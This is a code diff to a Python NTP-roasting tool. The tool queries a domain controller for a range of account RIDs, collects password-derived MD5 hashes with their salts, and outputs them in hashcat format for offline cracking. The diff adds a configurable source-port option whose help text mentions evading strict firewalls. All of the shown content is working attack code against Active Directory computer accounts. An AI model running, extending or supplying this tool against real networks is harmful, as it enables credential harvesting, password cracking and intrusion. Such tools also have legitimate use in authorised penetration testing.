@@ -22,7 +22,7 @@ def hashcat_format(rid : int, hashval : bytes, salt : bytes) -> str:
   return f'{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'
 
 
-def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, old_pwd : bool) -> List[Tuple[int, bytes, bytes]]:
+def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, old_pwd : bool, src_port : int = 0) -> List[Tuple[int, bytes, bytes]]:
   """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
      Rate is the number of queries per second to send.
      Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
@@ -37,9 +37,9 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, o
   # Bind UDP socket.
   with socket(AF_INET, SOCK_DGRAM) as sock:
     try:
-      sock.bind(('0.0.0.0', 123))
+      sock.bind(('0.0.0.0', src_port))
     except PermissionError:
-      raise PermissionError('No permission to listen on port 123. Please run as root.')
+      raise PermissionError(f'No permission to listen on port {src_port}. May need to run as root.')
 
     query_interval = 1 / rate
     last_ok_time = time()
@@ -135,6 +135,11 @@ listen privileges) is needed.
     '-l', '--old-hashes', action='store_true',
     help=f'Obtain hashes of the previous computer password instead of the current one.'
   )
+  argparser.add_argument(
+    '-p', '--src-port',
+    type=int, default=0, metavar='PORT',
+    help='NTP source port to use. A dynamic unprivileged port is chosen by default. Could be set to 123 to get around a strict firewall.'
+  )
 
   # Required arguments.
   argparser.add_argument(
@@ -150,7 +155,7 @@ def main():
   
   args = get_args()
   output = args.out
-  for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout, args.old_hashes):
+  for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout, args.old_hashes, args.src_port):
     print(hashcat_format(rid, hashval, salt), file=output)
   
 
